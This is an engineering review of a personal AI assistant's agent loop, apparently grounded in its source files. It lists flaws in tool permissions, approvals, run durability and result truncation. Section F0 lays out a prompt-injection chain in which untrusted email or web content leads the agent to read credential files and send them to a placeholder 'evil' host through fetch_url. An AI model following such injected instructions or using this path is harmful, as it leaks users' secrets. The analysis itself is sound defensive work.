# Track F: where the current agent loop breaks (read from the source, 2026-09-29)

Grounded in `backend/personal_os/app.py` (`_chat_stream`), `tools.py`, `sandbox.py`, `llm.py`.

## F0. SECURITY: the default tool modes form a complete exfiltration chain

`tools.py:26`
```python
DEFAULT_MODE = {"safe": "on", "writes": "on", "network": "on", "executes": "on", "external": "ask"}
```

Only `external` asks. That means, with stock settings and no prompt shown to the user:

| step | tool | danger | default mode |
|---|---|---|---|
| untrusted text enters the loop | `gmail_read` / `fetch_url` / `web_search` | safe / network | **on** |
| read any file on disk | `run_python` | executes | **on** |
| send the bytes to an attacker | `fetch_url("https://evil/?d=…")` | network | **on** |

And `sandbox.py:25` deliberately allows disk-wide reads:
```
(allow file-read*)          # documented: "Reads are allowed so scripts can analyse your local files"
```
The sandbox denies *network*, which correctly stops the script from exfiltrating — but the script's
**stdout flows straight back into the model's context**, and the model then has `fetch_url` on `on`.
The sandbox boundary is bypassed by the agent loop itself.

This is Simon Willison's "lethal trifecta" (private data + untrusted content + exfiltration channel)
present by default, with zero approval prompts. `~/.aws/credentials`, `~/.ssh/id_rsa`, `.env`,
browser cookie DBs and the app's own SQLite file are all readable.

Mitigations belong in Track D, but the minimum fixes are: treat `fetch_url` egress as an
approval-worthy or allowlisted action once untrusted content is in context; taint-track tool
results; and stop `run_python`'s stdout from being a laundering path for disk reads.

## F1. An agent run cannot outlive one HTTP connection

`_chat_stream()` is an async generator streaming SSE. All run state is local variables (`buf`,
`messages`, `tool_events`, `tracer.spans`) plus two module-level in-memory dicts:

- `_active: dict[str, asyncio.Event]` — stop signals
- `_approvals: dict[str, asyncio.Future]` (`app.py:44`) — pending approvals

Consequences: closing the window, a backend reload (`dev.sh` uses autoreload), a laptop sleep or a
crash kills the run with no record and no resume. There is no `runs` table. Nothing can be
restarted, inspected after the fact as a *run*, or executed without a window open. Every
background/scheduled/proactive feature in the existing roadmap (L3 brief, L4 heartbeat, A8
scheduled tasks) is blocked on this.

**Fix shape:** a `runs` table (id, status, cursor, messages JSON, budget, created/updated) + a
`run_steps` / tool-ledger table; the SSE endpoint becomes a *view* onto a run, not the run itself.

## F2. Approvals are in-memory, blocking, serial and time-bombed

```python
if mode == "ask":
    fut = asyncio.get_event_loop().create_future()
    _approvals[c["id"]] = fut
    ... await asyncio.wait_for(asyncio.shield(fut), timeout=10) ... # keepalive loop
    if waited >= 600: fut.set_result("deny")
```
- **Not durable** — a restart loses every pending approval; the UI card hangs forever.
- **Blocks the entire stream** — nothing else in the turn proceeds while the user decides.
- **Serial** — five external calls in one round = five sequential modal decisions; no batching.
- **Auto-denies after 10 minutes** — step away from the desk and the work is silently discarded.
- **Keyed by model-supplied `call_id`** — collisions are possible across concurrent runs.
- Decisions persist to settings (`always_chat`/`always_global`) but there is no *rule* model
  (no per-argument scoping, e.g. "always allow calendar_create, never for attendees outside my
  domain"), and no way to revoke a granted "always" from one place.

## F3. The round cap fails silently and destructively

`llm.py` `maxToolRounds: 8`; `app.py:325` `max_rounds = int(cfg.get("maxToolRounds") or 8)`.

```python
for _round in range(max_rounds + 1):
    ...
    if stop.is_set() or not calls or _round == max_rounds:
        break
```
On the final iteration the model's tool calls are **discarded without executing and without telling
the model**. If that response was tool-calls-only (common), `buf` is empty and the user gets a
blank or truncated reply with no explanation. Nothing injects "you are out of tool budget —
summarise what you have now", which is the standard remedy.

The cap is also the *only* bound on a run. There is no token budget, no wall-clock budget, no cost
ceiling, and no circuit breaker on repeated tool failures — despite `usage.py` already computing
per-call cost.

## F4. Tool calls execute strictly serially

```python
for c in calls:
    ... result = await toolbox.call(c["name"], args, tool_ctx)
```
The model can emit parallel tool calls and `llm.py` collects them all, but execution is a serial
`for` loop with an `await` inside. Six `web_search`/`fetch_url` calls that could run concurrently
take 6× the latency. Everything is already async — this is `asyncio.gather` with a concurrency
limit plus a serialisation rule for writes.

## F5. All 25 tool schemas are injected on every turn

`toolbox.schemas(modes)` returns every enabled, available tool. No task-based filtering, no
grouping, no progressive disclosure, no deferred schema loading. Fixed prompt cost on every round
of every chat, and selection accuracy degrades as the count grows — and the roadmap wants to add an
MCP client, which multiplies tool count by an order of magnitude.

## F6. No write journal, no undo, no dry run

`gmail_send`, `calendar_create`, `gmail_modify` (archive!), `todo_delete`, `board_move_card` all
act with no inverse recorded. `tool_events` is stored on the message for *display* — it has
`arguments` and a truncated `result_preview`, not enough to reverse an action, and it is keyed to a
message rather than being a queryable ledger. There is no delayed-send window on `gmail_send`, and
no "what did the agent do" audit view separate from reading chat transcripts.

## F7. Tool results are blunt-truncated into the context

```python
messages.append({"role": "tool", ..., "content": summarize_result(for_model, 24000)})
```
`summarize_result` is `json.dumps` then `s[:limit] + "…"` — it cuts mid-token, mid-JSON, mid-word.
A large `read_document` or `gmail_search` silently loses its tail with only an ellipsis as signal.
No pagination cursor, no structured "N more results, call again with offset", no offloading of
large results to a handle/reference the model can re-open. A 24 000-char result also blows a large
hole in the context window on every subsequent round of the same run.

## F8. Nothing verifies the work happened

The loop terminates when the model stops emitting tool calls. There is no verification pass, no
critic, no check that a claimed action took effect. A denied tool returns an error string the model
may paper over, and the model can assert "I've sent that email" with no send having occurred. For a
life-OS that touches mail and calendar, unverified completion claims are the highest-cost failure.

## F9. No subagents, no context isolation, no compaction

One flat message list per conversation. A long research task pollutes the chat's context with
dozens of tool results that stay there for every later turn. There is no compaction, no summarise-
and-drop, no separate context for a sub-task, and no way to spend 40 tool rounds on a research
question without wrecking the conversation it was asked in.

## F10. No procedural memory

Auto-learn extracts *facts* (memories) and *entities* (graph). It never captures **how** something
was done. A successful 12-step "compile my week from calendar + mail + todos" run leaves no reusable
artifact; the next identical request re-derives everything from scratch at full cost and with fresh
odds of failing differently.

## F11. Smaller things

- `learn_from_exchange` runs inline after every reply, adding latency to the tail of every turn;
  it should be queued.
- The `stop` flag only breaks the streaming loop; an in-flight tool call runs to completion.
- No file-system tools at all, yet `run_python` is a de-facto unrestricted local file reader — the
  permission model claims a boundary the sandbox does not enforce (see F0).
- Trace spans are stored per message; there is no cross-run view ("which tools fail most").
